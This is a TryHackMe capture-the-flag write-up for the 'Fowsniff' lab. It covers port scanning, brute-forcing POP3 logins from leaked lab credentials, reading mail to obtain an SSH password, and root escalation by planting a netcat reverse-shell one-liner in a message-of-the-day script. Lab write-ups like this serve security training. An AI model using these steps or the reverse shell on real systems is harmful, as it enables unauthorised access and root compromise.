# TryHackMe-Fowsniff

>Abdullah Rizwan | 09:56 PM, 17th October 2020

## NMAP

```
Nmap scan report for 10.10.47.52
Host is up (0.17s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA UIDL TOP SASL(PLAIN) PIPELINING AUTH-RESP-CODE RESP-CODES USER
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: OK listed more SASL-IR have post-login LOGIN-REFERRALS AUTH=PLAINA0001 LITERAL+ capabilities IDLE ENABLE IMAP4rev1 ID Pre-login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.12 seconds

```

On the webpage there is a breach of company so we may get thier hacked twitter account 

`https://twitter.com/fowsniffcorp?lang=en`

On the pastebin we can find a list of possible passwords or user name accounts

`https://pastebin.com/NrAqVeeX`


Users 

```
mauer@fowsniff
mustikka@fowsniff
tegel@fowsniff
baksteen@fowsniff
seina@fowsniff
stone@fowsniff
mursten@fowsniff
parede@fowsniff
sciana@fowsniff
```

Passwords of Md5

```
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
```

## Metasploit

```
msf5 auxiliary(scanner/pop3/pop3_login) > run

[-] 10.10.47.52:110       - 10.10.47.52:110 - Failed: 'seina:mailcall', '-ERR [AUTH] Authentication failed.'
[!] 10.10.47.52:110       - No active DB -- Credential data will not be saved!
[-] 10.10.47.52:110       - 10.10.47.52:110 - Failed: 'seina:bilbo101', '-ERR [AUTH] Authentication failed.'
[-] 10.10.47.52:110       - 10.10.47.52:110 - Failed: 'seina:apples01', '-ERR [AUTH] Authentication failed.'
[-] 10.10.47.52:110       - 10.10.47.52:110 - Failed: 'seina:skyler22', ''
[+] 10.10.47.52:110       - 10.10.47.52:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
[*] 10.10.47.52:110       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
`scoobydoo2`


## POP3 

Now to use pop3 which is email protocol through command line

`nc 10.10.47.52 110`

This will connect to protocol

```
USER seina
PASS scoobydoo2
```

There are two mails
```
root@kali:~# nc 10.10.47.52 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
STAT
+OK 2 2902
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR
-ERR Invalid message number: 
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
.
```

```
OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.


```

We can ssh into box with username `baksteen` password `S1ck3nBluff+secureshell`



## SSH

After logging with SSH we are in and now let's find some files

```
baksteen@fowsniff:/$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
baksteen@fowsniff:/$ find / -group users 2>/dev/null
/opt/cube/cube.sh
/run/user/1004
/run/user/1004/systemd
/run/user/1004/systemd/private
/run/user/1004/systemd/notify
/home/baksteen/.cache
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir
/home/baksteen/Maildir/tmp
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log

```

Here we can see cube.sh

nano cube.sh and paste it in 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.94.60 5555 >/tmp/f`

start nc listener nc -lvp 5555

Logout from the machine and log in back since it's a message of the day file it will run as root when you login to display message and your listener will capture it.